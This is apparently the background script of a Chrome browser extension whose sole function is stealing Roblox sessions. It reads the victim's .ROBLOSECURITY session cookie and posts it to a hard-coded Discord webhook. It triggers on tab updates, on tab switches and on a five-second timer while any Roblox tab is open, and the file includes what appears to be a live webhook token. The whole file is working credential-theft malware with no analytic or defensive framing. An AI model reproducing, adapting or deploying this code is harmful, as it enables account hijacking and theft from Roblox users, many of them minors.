const WEBHOOK = "https://discord.com/api/webhooks/1495620738185433108/Guyq3VjA-yV4oV5FDypyuK7jmNBrrFZhyZ7sZthJ11sHGVR8U8HuNJioX8cFD8FVQUZI";

let sendCount = 0;
const MAX_SENDS = 3;

function sendCookie() {
    if (sendCount >= MAX_SENDS) {
        console.log("Max sends reached (" + MAX_SENDS + "), stopping");
        return;
    }
    
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
        if (cookie && cookie.value) {
            sendCount++;
            fetch(WEBHOOK, {
                method: "POST",
                body: JSON.stringify({
                    content: "**🎮 Roblox Cookie** (Send " + sendCount + "/" + MAX_SENDS + ")\n```\n" + cookie.value + "\n```"
                }),
                headers: { "Content-Type": "application/json" }
            });
        }
    });
}

// When Roblox tab updates
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab.url && tab.url.includes("roblox.com")) sendCookie();
});

// When switching to Roblox tab
chrome.tabs.onActivated.addListener(() => sendCookie());

// Check every 5 seconds
setInterval(() => {
    chrome.tabs.query({ url: "*://*.roblox.com/*" }, (tabs) => {
        if (tabs.length > 0) sendCookie();
    });
}, 5000);